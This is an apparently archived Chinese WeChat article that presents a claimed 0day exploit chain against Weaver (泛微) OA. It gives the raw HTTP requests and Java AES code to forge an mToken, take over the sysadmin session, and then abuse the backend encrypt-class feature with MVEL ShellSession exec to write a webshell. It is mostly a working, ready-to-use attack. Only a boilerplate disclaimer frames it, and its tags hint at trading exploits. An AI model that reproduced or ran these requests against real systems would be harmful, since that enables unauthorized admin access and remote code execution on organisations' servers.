---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【0day】泛微OA前台登录绕过+后台组合拳RCE  
原创 XingYue404  星悦安全   2025-07-01 11:38  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x01 登录绕过  
### 利用/dwr/call接口读取加密key  
  
```
POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1Host: xxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ceGLwibV7eibnrbLN1s9VOtTUMFUFw5wm7jEQPWogeciaf1KLHCTIGRUiaAeyDOQmIhQIrqMQ5JjyZ0A/640?wx_fmt=other&from=appmsg "")  
  
其中security.key为 5f2f28dd-db4a-45  
### 调用aes加密函数  
  
```
import java.security.SecureRandom;import javax.crypto.Cipher;import javax.crypto.KeyGenerator;import javax.crypto.spec.SecretKeySpec;import javax.xml.bind.DatatypeConverter;publicclass Main {    public static String encrypt(String str, String str2) {        try {            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");            SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");            secureRandom.setSeed(str2.getBytes());            keyGenerator.init(128, secureRandom);            SecretKeySpec secretKeySpec = new SecretKeySpec(keyGenerator.generateKey().getEncoded(), "AES");            Cipher cipher = Cipher.getInstance("AES");            cipher.init(1, secretKeySpec);            return DatatypeConverter.printHexBinary(cipher.doFinal(str.getBytes()));        } catch (Exception e) {            e.printStackTrace();            return"";        }    }    public static void main(String[] args) {        System.out.println(encrypt("1;1;"+System.currentTimeMillis(),"5f2f28dd-db4a-45"));    }}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ceGLwibV7eibnrbLN1s9VOtTmMywj3iayQJ2T19WpBv1vMxXicuLMSnB8INMG1iaK11gEdxovtcCorDicw/640?wx_fmt=other&from=appmsg "")  
  
获取到密钥，即为下面需要用到的mToken  
  
### 获取sessionKey  
  
```
GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=BAAD7750912407C15FBC7CA2BDA4BDDDAEACE215E26BB871CE8D171028A66A70&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1Host: xxxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
```  
  
###   
  
获取到sysadmin 的sessionKey  
### 登录后台  
  
将sessionKey转换为ecology_JSessionid即可登录后台  
  
```
GET /weaver/ImgFileDownload/a.swf?sessionkey=b20e3665-d8a8-403d-a041-0c5883626da4&a=.swf HTTP/1.1Host: xxxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
```  
  
###   
###   
## 0x02 后台RCE  
### 添加方法  
  
```
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1Host: xxxx:xxxIf-None-Match: "6evu6PUo/Cz"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateIf-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMTContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIuCache-Control: max-age=0Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="operation"add------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="encryptname"ttttaaa------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="encryptclass"org.mvel2.sh.ShellSession------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="encryptmethod"exec------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="decryptmethod"exec------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="isdialog"0------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="x"; filename="x"x------WebKitFormBoundaryVnIIugCdViAmEyK3--
```  
  
###   
### 查看添加的ID  
  
```
POST /api/integration/Outter/getOutterSysEncryptClassOperates?a=1.swf HTTP/1.1Host: xxxx:xxxIf-None-Match: "6evu6PUo/Cz"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateIf-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMTContent-Type: application/x-www-form-urlencodedCache-Control: max-age=0Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
```  
  
###   
  
此处ID为2  
### 直接执行java代码写shell  
  
```
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1Host: xxxx:xxxIf-None-Match: "6evu6PUo/Cz"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateIf-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMTContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryITdrxCache-Control: max-age=0Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="operation"test------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="plaintext"马子------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="id"2------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="x"; filename="x"1------WebKitFormBoundaryITdrxxca8L1Xo7Rq--
```  
  
###   
  
写入进 /getaddr.jsp  
## 0x03 关注公众号  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**关注公众号，持续更新漏洞文章!**  
  
****  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ceGLwibV7eibnrbLN1s9VOtT4NX6MHrjbWnvSExFrJ1gIXIquQhUx0besS8XoGU1l7vWDs0icUic3l2g/640?wx_fmt=jpeg&from=appmsg "")  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
